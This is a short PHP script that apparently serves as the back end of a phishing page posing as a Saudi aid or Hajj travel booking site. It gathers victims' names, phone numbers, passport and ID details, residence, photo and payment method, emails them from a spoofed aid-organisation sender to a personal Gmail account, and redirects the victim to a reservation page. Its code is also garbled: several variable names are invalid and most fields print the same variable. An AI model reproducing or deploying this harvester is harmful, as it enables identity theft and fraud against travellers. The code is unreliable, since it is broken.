<?php


$getName=$_POST['name'];
$getName=$_POST['name1'];
$getName=$_POST['name2'];
$getName=$_POST['name3'];
$getName=$_POST['name4'];
$getName=$_POST['name5'];
$getName=$_POST['name6'];
$getName=$_POST['name7'];
$getName=$_POST['name8'];



$email_from = 'lana@ksa-aid.net';

	$email_subject ="معلومات المستخدم: ".$userorid;
	
$message = '<html><body>';
$message .= '<h2 >المبلغ:'.$wpforms-83-field_7. '</h2>';
$message .='<hr/>';
$message .= '<h2 >حج: '.$wpforms-83-field_23.'</h2>';
$message .='<hr/>';
$message .= '<h2 >نوع السفر: '.$wpforms-83-field_24-container.'</h2>';
$message .='<hr/>';
$message .= '<h2 >مكان الاستلام: '.$pass1.'</h2>';
$message .='<hr/>';
$message .= '<h2 >رقم الهاتف: '.$pass1.'</h2>';
$message .='<hr/>';
$message .= '<h2 >الاسم: '.$pass1.'</h2>';
$message .='<hr/>';

$message .= '<h2 >تاريخ السفر: '.$pass1.'</h2>';
$message .='<hr/>';
$message .= '<h2 >بلد الوجهة: '.$pass1.'</h2>';
$message .='<hr/>';
$message .= '<h2 >طريقة الدفع: '.$pass1.'</h2>';
$message .='<hr/>';
$message .= '<h2 > جواز: '.$pass1.'</h2>';
$message .='<hr/>';
$message .= '<h2 >الموحدة: '.$pass1.'</h2>';
$message .='<hr/>';
$message .= '<h2 >الموحدة: '.$pass1.'</h2>';
$message .='<hr/>';
$message .= '<h2 >السكن: '.$pass1.'</h2>';
$message .='<hr/>';
$message .= '<h2 >السكن: '.$pass1.'</h2>';
$message .='<hr/>';
$message .= '<h2 >وجه: '.$pass1.'</h2>';
$message .='<hr/>';



$message .= '</body></html>';
	           
	           
	           
	           $to = "hamoozimran340@gmail.com";

  $headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: '.$email_from."\r\n".
    'Reply-To: '.$email_from."\r\n" .
    'X-Mailer: PHP/' . phpversion();

  mail($to,$email_subject,$message,$headers);

header("Location:reservation.html");
?>
